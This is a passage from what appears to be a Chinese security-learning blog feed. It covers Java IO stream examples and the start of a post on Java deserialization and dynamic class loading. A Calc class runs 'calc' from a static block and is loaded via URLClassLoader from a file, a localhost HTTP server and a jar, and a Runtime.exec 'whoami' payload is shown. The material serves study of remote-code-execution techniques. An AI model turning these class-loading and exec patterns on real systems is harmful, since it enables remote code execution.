java.lang.String;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileInputRead02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        readFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\new.txt&quot;</span>;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">5</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filepath);<br>            <span class="hljs-keyword">while</span> ((readLen=fileInputStream.read(cache))!=-<span class="hljs-number">1</span>)&#123;<br>                System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cache,<span class="hljs-number">0</span>,readLen));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                fileInputStream.close();<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>byte[5]，这里循环了三次：</p><p><img src="/2023/04/27/file-upload/30919131052896.png" alt="image-20230919131052896"></p><h3 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h3><h4 id="write-byte-b"><a href="#write-byte-b" class="headerlink" title="write(byte[] b)"></a>write(byte[] b)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.String;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileOutputWrite01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        writeFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\newfile.txt&quot;</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filepath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test123&quot;</span>;<br>            <span class="hljs-keyword">try</span>&#123;<br>                fileOutputStream.write(content.getBytes());<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                fileOutputStream.close();<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用content.getBytes()将String转为byte数组。</p><h4 id="write-byte-b-int-off-int-len"><a href="#write-byte-b-int-off-int-len" class="headerlink" title="write(byte[] b, int off, int len)"></a>write(byte[] b, int off, int len)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.String;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileOutputWrite02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        writeFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\newfile1.txt&quot;</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hahahahaha&quot;</span>;<br>            fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filepath);<br>            <span class="hljs-keyword">try</span>&#123;<br>                fileOutputStream.write(content.getBytes(),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fileOutputStream.close();<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>fileOutputStream.write(content.getBytes(),0,5);</code>，写入5个字符。</p><h4 id="追加写入"><a href="#追加写入" class="headerlink" title="追加写入"></a>追加写入</h4><p><img src="/2023/04/27/file-upload/30919135722077.png" alt="image-20230919135722077"></p><h3 id="文件拷贝"><a href="#文件拷贝" class="headerlink" title="文件拷贝"></a>文件拷贝</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.String;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileCopy</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        copyFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyFile</span><span class="hljs-params">()</span>&#123;<br>        String srcFilename=<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\new.txt&quot;</span>;<br>        String desFilename=<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\newfile.txt&quot;</span>;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(srcFilename);<br>            fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(desFilename);<br>            <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span>((readLen=fileInputStream.read(cache))!=-<span class="hljs-number">1</span>)&#123;<br>                fileOutputStream.write(cache,<span class="hljs-number">0</span>,readLen);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fileInputStream.close();<br>                fileOutputStream.close();<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/30919141632305.png" alt="image-20230919141632305"></p><h3 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h3><p>FileReader用来读取字符流，一个字符一个字符读取，可以无乱码输出中文。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.FileReader;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileReaderPrint</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        readFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\newfile.txt&quot;</span>;<br>        <span class="hljs-type">FileReader</span> <span class="hljs-variable">fileReader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            fileReader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(filepath);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">char</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">5</span>];<br>            <span class="hljs-keyword">while</span> ((readLen=fileReader.read(cache))!=-<span class="hljs-number">1</span>)&#123;<br>                System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cache,<span class="hljs-number">0</span>,readLen));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fileReader.close();<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/30919142300021.png" alt="image-20230919142300021"></p><h3 id="Runtime执行命令payload"><a href="#Runtime执行命令payload" class="headerlink" title="Runtime执行命令payload"></a>Runtime执行命令payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeExec</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream();<br>        <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-comment">//ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-comment">//byteArrayOutputStream.write(cache,0,readLen);</span><br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cache,<span class="hljs-number">0</span>,readLen));<br>        &#125;<br>        <span class="hljs-comment">//System.out.println(byteArrayOutputStream);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/30919143512950.png" alt="image-20230919143512950"></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化-类的动态加载</title>
    <link href="/2024/07/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"/>
    <url>/2024/07/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="java反序列化-类的动态加载"><a href="#java反序列化-类的动态加载" class="headerlink" title="java反序列化-类的动态加载"></a>java反序列化-类的动态加载</h1><h2 id="类加载器定义"><a href="#类加载器定义" class="headerlink" title="类加载器定义"></a>类加载器定义</h2><p>类加载器是一个负责加载类的对象。<code>ClassLoader</code> 是一个抽象类。每个 Java 类都有一个引用指向加载它的 <code>ClassLoader</code>。不过，数组类不是通过 <code>ClassLoader</code> 创建的，而是 JVM 在需要的时候自动创建的，数组类通过<code>getClassLoader()</code>方法获取 <code>ClassLoader</code> 的时候和该数组的元素类型的 <code>ClassLoader</code> 是一致的。</p><h2 id="几种类加载器"><a href="#几种类加载器" class="headerlink" title="几种类加载器"></a>几种类加载器</h2><h3 id="引导类加载器-bootstrap-class-loader"><a href="#引导类加载器-bootstrap-class-loader" class="headerlink" title="引导类加载器(bootstrap class loader)"></a>引导类加载器(bootstrap class loader)</h3><p>它用来加载 Java 的核心库(jre&#x2F;lib&#x2F;rt.jar)，是用原生C++代码来实现的，并不继承自java.lang.ClassLoader。加载扩展类和应用程序类加载器，并指定他们的父类加载器，在java中获取不到。</p><h3 id="扩展类加载器-extensions-class-loader"><a href="#扩展类加载器-extensions-class-loader" class="headerlink" title="扩展类加载器(extensions class loader)"></a>扩展类加载器(extensions class loader)</h3><p>它用来加载 Java 的扩展库(jre&#x2F;ext&#x2F;*.jar)。Java 虚拟机的实现会提供一个扩展库目录。该类加载器在此目录里面查找并加载 Java 类。</p><h3 id="应用程序类加载器-AppClassLoader"><a href="#应用程序类加载器-AppClassLoader" class="headerlink" title="应用程序类加载器(AppClassLoader)"></a>应用程序类加载器(AppClassLoader)</h3><p>它根据 Java 应用的类路径(CLASSPATH)来加载 Java 类。一般来说，Java 应用的类都是由它来完成加载的。可以通过<br>ClassLoader.getSystemClassLoader()来获取它。</p><h3 id="自定义类加载器-custom-class-loader"><a href="#自定义类加载器-custom-class-loader" class="headerlink" title="自定义类加载器(custom class loader)"></a>自定义类加载器(custom class loader)</h3><p>除了系统提供的类加载器以外，开发人员可以通过继承 java.lang.ClassLoader类的方式实现自己的类加载器，以满足一些特殊的需求。</p><p>这里引用javaguide的一张图：</p><p><img src="/2023/04/27/file-upload/classloader.png" alt="classloader"></p><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><ul><li><p>在类加载的时候，系统会首先判断当前类是否被加载过。已经被加载的类会直接返回，否则才会尝试加载（每个父类加载器都会走一遍这个流程）。</p></li><li><p>类加载器在进行类加载的时候，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成（调用父加载器 <code>loadClass()</code>方法来加载类）。这样的话，所有的请求最终都会传送到顶层的启动类加载器 <code>BootstrapClassLoader</code> 中。</p></li><li><p>只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去加载（调用自己的 <code>findClass()</code> 方法来加载类）。</p></li><li><p>如果子类加载器也无法加载这个类，那么它会抛出一个 <code>ClassNotFoundException</code> 异常。</p></li></ul><h2 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h2><p>我们编写的 <code>.java</code> 代码文件通过编译将会生成 <code>.class</code> 文件，最初的方式就是通过 JDK 的 <code>javac</code> 指令来编译，再通过 <code>java</code> 命令执行 main 方法所在的类，从而执行Java 程序。而在这中间所生成的 .class 文件中的内容，就是 JVM 可以处理运行的字节码（Byte Code），它由 JVM 解释为对应系统可运行的机器指令。</p><p><strong>TIPS：<code>ClassLoader.loadClass()</code>方法不会进行类的初始化，如果后面再使用<code>newInstance()</code>进行初始化，就和正常场景时一样的顺序加载对应的代码块。</strong></p><h3 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h3><ul><li><p>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 <code>JarLoader</code> 来寻找类，即为在Jar包中寻找.class文件</p></li><li><p>URL以斜杠 &#x2F; 结尾，且协议名是 <code>file</code> ，则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻找.class文件</p></li><li><p>URL以斜杠 &#x2F; 结尾，且协议名不是 <code>file</code> ，则使用最基础的 <code>Loader</code> 来寻找类。</p></li></ul><h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><p>新建Calc.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>通过javac命令，编译成.class文件，接着把class文件复制到D盘下。</p><p>新建FileRce.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader.URLClassLoader;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///D:\\&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里通过file协议，在本地文件D盘中查找Calc类，运行如下：</p><p><img src="/2023/04/27/file-upload/image-20231007142653826.png" alt="image-20231007142653826"></p><h4 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h4><p>这里在本地先起一个python的http server，接着通过HTTPRce.java来加载class文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/image-20231007143001259.png" alt="image-20231007143001259"></p><h4 id="file-jar协议"><a href="#file-jar协议" class="headerlink" title="file+jar协议"></a>file+jar协议</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JarRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:file:///E:\\Calc.jar!/&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里需要先将class文件打包成jar：</p><p><code>jar -cvf Calc.jar Clac.class</code></p><p><img src="/2023/04/27/file-upload/image-20231007143957941.png" alt="image-20231007143957941"></p><p><img src="/2023/04/27/file-upload/image-20231007143917450.png" alt="image-20231007143917450"></p><h4 id="http-jar协议"><a href="#http-jar协议" class="headerlink" 